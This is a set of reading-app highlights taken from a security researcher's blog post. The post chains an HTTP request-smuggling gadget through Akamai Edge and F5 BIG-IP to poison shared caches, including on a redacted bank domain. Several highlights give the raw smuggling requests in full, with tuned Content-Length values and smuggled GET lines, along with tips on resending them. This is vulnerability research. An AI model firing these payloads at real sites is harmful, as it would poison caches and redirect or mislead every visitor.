---
author: Malicious Group
aliases:
  - From Akamai to F5 to NTLM... With Love.
tags:
  - readwise/articles
url: https://blog.malicious.group/from-akamai-to-f5-to-ntlm/
date: 2024-08-20
---
# From Akamai to F5 to NTLM... With Love.

![rw-book-cover](https://blog.malicious.group/content/images/2023/10/comics-1.png)

## Highlights


> In this post, I am going to show the readers how I was able to abuse Akamai so I could abuse F5 to steal internal data
> [View Highlight](https://read.readwise.io/read/01hgzzns4s5bq7vr5xanzgwb9e)



> I am scanning targets with the CL.0 gadget **nameprefix1**
> [View Highlight](https://read.readwise.io/read/01hgzzptahqdjthr3rtjn943b4)



> ![](https://blog.malicious.group/content/images/2023/10/image-7.png)
>  The most obvious identifier in the above image is the smuggle gadget and variation being used. The **nameprefix1** is the smuggle gadget and the **TRACE** is a technique used to verify the gadget.
> [View Highlight](https://read.readwise.io/read/01hgzzr13wr1xcajnrcp1sprm1)



> Let's take a closer look at request 1, 2 and 3.
>  GET / HTTP/1.1
>  Host: redacted.tld
>  Accept-Encoding: gzip, deflate
>  Accept: */*, text/smuggle
>  Accept-Language: en-US;q=0.9,en;q=0.8
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
>  Connection: close
>  Cache-Control: max-age=0
>  Request 1 will always be a normal GET request to the endpoint in question.
> [View Highlight](https://read.readwise.io/read/01hgzzrv58gak2d83076ndabe9)



> Request 2 and 3 are identical, so in this example using the smuggle gadget detected above, **nameprefix1** using the **TRACE** variation, the requests will look like the following.
>  POST / HTTP/1.1
>  Host: redacted.tld
>  Accept-Encoding: gzip, deflate, br
>  Accept: */*
>  Accept-Language: en-US;q=0.9,en;q=0.8
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
>  Connection: keep-alive
>  Cache-Control: max-age=0
>  Content-Type: application/x-www-form-urlencoded
>  Foo: bar
>  Content-Length: 27
>  TRACE / HTTP/1.1
>  Smuggle:
> [View Highlight](https://read.readwise.io/read/01hgzzs4kk7drzgsdb8sc18k6t)



> Since we know the **TRACE** verb and the web root path worked to throw the 405 error, what happens if we use **GET** instead, with a endpoint like **/robots.txt**?
> [View Highlight](https://read.readwise.io/read/01hgzzxrmv72wekncfrtam9qmf)



> Let's start by modifying requests 2 and 3 using the following.
>  POST / HTTP/1.1
>  Host: redacted.tld
>  Accept-Encoding: gzip, deflate
>  Accept: */*, text/smuggle
>  Accept-Language: en-US;q=0.9,en;q=0.8
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
>  Connection: keep-alive
>  Cache-Control: max-age=0
>  Origin: https://p4p9itr608.com
>  Content-Type: application/x-www-form-urlencoded
>  Foo: bar
>  Content-Length: 35
>  GET /robots.txt HTTP/1.1
>  Smuggle:
> [View Highlight](https://read.readwise.io/read/01hgzzzjpbyjf083yjjhyznj5e)



> ![](https://blog.malicious.group/content/images/2023/10/image-12.png)
>  It worked! After 6 attempts, the smuggled request was working. By changing the verb, path and content-length to reflect the values, I was able to get the smuggled endpoint and verb by accessing the main site using tab 1 (the normal GET). This means that when a user tries to access **https://redacted.tld/** they will be redirected to **https://redacted.tld/robots.txt** without them doing anything other than accessing the same endpoint we poisoned, in this case, the / folder.
> [View Highlight](https://read.readwise.io/read/01hh001a0tj8bc50yjaxt8anv3)



> At this point in my research, I knew the following.
>  • I know of at least 1 gadget that effects Akamai Edge customers
>  • I know the gadget effects the global cache in a lot of instances
>  • I know I have some play with the smuggle content body for this gadget
>  This tells me now that I know there are a lot of vulnerable targets, I need to find a way to escalate the smuggle gadgets to increase impact
> [View Highlight](https://read.readwise.io/read/01hh004qccsqeg38zwx5gtybdn)



> Akamai edge customers, using F5's BIGIP have a global cache poisoning issue in most instances I found.
> [View Highlight](https://read.readwise.io/read/01hh008x4xzf7x76ta0f4bkdtm)



> Now that I know Akamai is allowing some odd smuggling behaviors, and I also know F5's BIGIP is vulnerable to a cache poisoning bug if the request is passed from Akamai edge.
> [View Highlight](https://read.readwise.io/read/01hh009k3ptkhm74wh63kfx6bt)



> I didn't find anything on the domain to chain to, so I went back to testing host header injections again, almost guaranteed rejection, but had to check. Here is the modified requests I was sending to this bank, same as before.
>  POST / HTTP/1.1
>  Host: redacted.bank.tld
>  Accept-Encoding: gzip, deflate
>  Accept: */*, text/smuggle
>  Accept-Language: en-US;q=0.9,en;q=0.8
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
>  Connection: keep-alive
>  Cache-Control: max-age=0
>  Origin: https://p4p9itr608.com
>  Content-Type: application/x-www-form-urlencoded
>  Foo: bar
>  Content-Length: 42
>  GET http://example.com HTTP/1.1
>  Smuggle:
> [View Highlight](https://read.readwise.io/read/01hh00c0j1snzwbyt098xynb8z)



> after pressing send 5 to 10 times quickly, check the results now!
>  ![](https://blog.malicious.group/content/images/2023/10/image-18.png)
> [View Highlight](https://read.readwise.io/read/01hh00c7d61jnmd2dbstcpkqpr)

